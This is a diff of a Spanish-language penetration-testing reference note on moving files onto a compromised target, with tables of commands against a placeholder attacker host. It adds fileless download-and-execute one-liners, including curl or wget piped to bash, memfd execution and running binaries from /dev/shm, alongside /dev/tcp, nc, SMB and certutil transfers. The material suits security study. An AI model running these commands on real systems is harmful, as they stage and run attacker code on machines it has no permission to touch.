@@ -13,10 +13,7 @@ tags:
 > [!info] Referencia pura, no un zettel
 > Comandos para **traer** un archivo al objetivo (ingress). El criterio —qué canal según el entorno— vive en [[MOC - Transferencia de archivos]] y [[Traer herramientas al objetivo]]. Para sacar datos, [[Exfiltración - matriz de referencia]]; para hablar con un servicio FTP puntual, [[FTP - matriz de referencia]].
 
-`ATACANTE` es tu IP; `OBJETIVO` la víctima.
-
 ## Servir el archivo desde el box del atacante
-
 Cuando el objetivo no tiene internet pero te alcanza a vos.
 
 | Servidor | Comando |
@@ -43,6 +40,7 @@ SMB con credenciales fuerza SMBv3 y evita el modo abierto.
 | Copiar desde SMB del atacante | `copy \\ATACANTE\share\f.exe c:\temp\f.exe` |
 | Ejecutar desde SMB directo | `\\ATACANTE\share\f.exe` |
 
+
 ## Linux — traer
 
 | Método | Comando |
@@ -52,9 +50,13 @@ SMB con credenciales fuerza SMBv3 y evita el modo abierto.
 | bash puro por `/dev/tcp` (sin wget/curl) | `exec 3<>/dev/tcp/ATACANTE/80; echo -e "GET /f\r\n" >&3; cat <&3 >/tmp/f` |
 | `nc` — receptor en el objetivo | `nc -lvnp 4444 > /tmp/f` (atacante: `nc ATACANTE 4444 < f`) |
 | `scp` (si hay SSH) | `scp f user@OBJETIVO:/tmp/f` |
+| **Fileless**: script en memoria (pipe a shell) | `curl -s http://ATACANTE/s.sh \| bash` · `wget -qO- http://ATACANTE/s.sh \| sh` |
+| **Fileless**: one-liner | `bash -c "$(curl -fsSL http://ATACANTE/s.sh)"` |
+| **Fileless**: ELF por memfd | `fileless-elf-exec` (crea `memfd_create` y ejecuta sin tocar disco) |
+| Semi-fileless: a RAM (tmpfs) | `curl http://ATACANTE/bin -o /dev/shm/x && chmod +x /dev/shm/x && /dev/shm/x` |
+
 
 ## Sin ninguna utilidad de red — base64 por copiar y pegar
-
 Cuando solo hay una consola (shell restringida, sin salida de red).
 
 | Paso | Comando |
@@ -63,8 +65,8 @@ Cuando solo hay una consola (shell restringida, sin salida de red).
 | Decodificar (objetivo Linux) | `echo 'BASE64' \| base64 -d > /tmp/f` |
 | Decodificar (objetivo Windows) | `certutil -decode in.b64 out.exe` |
 
-## Verificar que llegó entero
 
+## Verificar que llegó entero
 Comparar el hash a ambos lados antes de ejecutar.
 
 | Sistema | Comando |
@@ -72,6 +74,7 @@ Comparar el hash a ambos lados antes de ejecutar.
 | Linux | `sha256sum f` |
 | Windows (PowerShell) | `Get-FileHash f.exe -Algorithm SHA256` |
 | Windows (sin PowerShell) | `certutil -hashfile f.exe SHA256` |
+
 
 ## Errores frecuentes
 
@@ -81,3 +84,4 @@ Comparar el hash a ambos lados antes de ejecutar.
 | binario "corrupto" al ejecutar | transferencia en modo texto (FTP) | forzar binario, o verificar hash |
 | SMB no monta desde Win10/11 | SMBv1 deshabilitado | `-smb2support` en el server |
 | PowerShell IWR muy lento | barra de progreso | `$ProgressPreference='SilentlyContinue'` |
+
